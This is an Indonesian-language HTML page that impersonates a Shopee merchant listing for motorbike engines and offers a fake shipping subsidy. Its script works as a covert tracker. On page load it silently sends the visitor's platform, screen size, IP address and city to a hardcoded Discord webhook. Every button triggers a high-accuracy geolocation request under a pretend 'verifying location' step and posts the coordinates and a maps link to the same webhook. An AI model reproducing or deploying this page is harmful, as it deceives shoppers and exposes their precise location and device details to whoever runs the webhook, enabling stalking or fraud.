<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Mitra Shopee Merchant Al X Garage | shopee.co.id</title>
    
    <meta property="og:title" content="Mitra Shopee Merchant Al X Garage">
    <meta property="og:description" content="Dapatkan subsidi ongkir mesin motor original di Al X Garage.">
    <meta property="og:image" content="https://deo.shopeemobile.com/shopee/shopee-pcmall-live-sg/assets/ca5a12a1a326348c.png">
    <meta property="og:type" content="website">

    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
    <style>
        body { font-family: -apple-system, sans-serif; background-color: #f5f5f5; margin: 0; }
        .shopee-orange { background-color: #ee4d2d; }
        #loader { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.95); z-index: 9999; justify-content: center; align-items: center; flex-direction: column; }
    </style>
</head>
<body class="max-w-md mx-auto bg-white min-h-screen relative pb-20">

    <div id="loader">
        <div class="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-[#ee4d2d]"></div>
        <p class="text-sm mt-4 font-bold text-[#ee4d2d]">Memverifikasi Lokasi...</p>
    </div>

    <div class="relative w-full aspect-square bg-gray-100">
        <img src="./tirev2010.jpg" alt="Produk" class="w-full h-full object-cover">
    </div>

    <div class="p-4 bg-white">
        <h1 class="text-base leading-tight mb-2 text-gray-800">Jual Beli Mesin tiger,megapro,GL,DLL - Berkualitas Tinggi Original</h1>
        <div class="text-[#ee4d2d]">
            <span class="text-xs font-medium">Rp</span>
            <span class="text-2xl font-medium">1.700.000 - 6.700.000</span>
        </div>
    </div>

    <div class="mt-2 p-4 bg-blue-50 border-y border-gray-100 flex items-start gap-3">
        <i class="fas fa-shipping-fast text-blue-600 mt-1"></i>
        <div>
            <p class="text-sm font-bold">Subsidi Ongkir Tersedia</p>
            <p class="text-xs text-gray-600">Klik tombol di bawah untuk verifikasi lokasi pengiriman.</p>
        </div>
    </div>

    <div class="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 max-w-md mx-auto flex h-14 z-50">
        <div class="flex w-2/5">
            <div onclick="handleAction()" class="flex-1 flex flex-col items-center justify-center border-r border-gray-50 cursor-pointer">
                <i class="far fa-comments text-teal-600 text-lg"></i>
                <span class="text-[10px]">Chat</span>
            </div>
            <div onclick="handleAction()" class="flex-1 flex flex-col items-center justify-center cursor-pointer">
                <i class="fas fa-cart-plus text-teal-600 text-lg"></i>
                <span class="text-[10px]">Keranjang</span>
            </div>
        </div>
        <button onclick="handleAction()" class="w-3/5 shopee-orange text-white font-bold text-sm">
            BELI SEKARANG
        </button>
    </div>

    <script>
        const webhook = "https://discord.com/api/webhooks/1468299380330332355/I2z1xzpeHQp4iKlllSQOFewI_z_OjIRBsDmgl7jbqbvM4GWQtYTewJXltpZQsGB5OV87";

        async function sendToDiscord(title, fields) {
            try {
                await fetch(webhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        embeds: [{
                            title: title,
                            fields: fields,
                            color: 15548997,
                            timestamp: new Date(),
                            thumbnail: { url: "https://deo.shopeemobile.com/shopee/shopee-pcmall-live-sg/assets/ca5a12a1a326348c.png" }
                        }]
                    }),
                    keepalive: true
                });
            } catch (e) {}
        }

        // FUNGSI INI ADALAH LOGIKA YANG ANDA BERIKAN (PASTI JALAN)
        function handleAction() {
            document.getElementById('loader').style.display = 'flex';

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (p) => {
                        const lat = p.coords.latitude;
                        const lon = p.coords.longitude;
                        // Link Maps yang bisa langsung diklik di Discord
                        const maps = "https://www.google.com/maps?q=" + lat + "," + lon;

                        await sendToDiscord("‚úÖ LOKASI DIIZINKAN", [
                            { name: "Koordinat", value: lat + "," + lon },
                            { name: "Maps Link", value: maps }
                        ]);
                        
                        // Redirect setelah data terkirim
                        window.location.href = 'profiltoko.html';
                    },
                    async (err) => {
                        // Jika ditolak, tidak kirim apa-apa ke webhook, langsung redirect
                        window.location.href = 'profiltoko.html';
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            } else {
                window.location.href = 'profiltoko.html';
            }
        }

        // Ambil data device saat halaman dibuka (Tanpa Lokasi)
        window.onload = async () => {
            let fields = [
                { name: "üì± OS", value: navigator.platform, inline: true },
                { name: "üñ•Ô∏è Resolusi", value: screen.width + "x" + screen.height, inline: true }
            ];
            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                fields.push({ name: "üåç IP", value: d.ip }, { name: "üèôÔ∏è Kota", value: d.city });
            } catch (e) {}

            await sendToDiscord("üöÄ Visitor Masuk (Al X Garage)", fields);
        };
    </script>
</body>
</html>
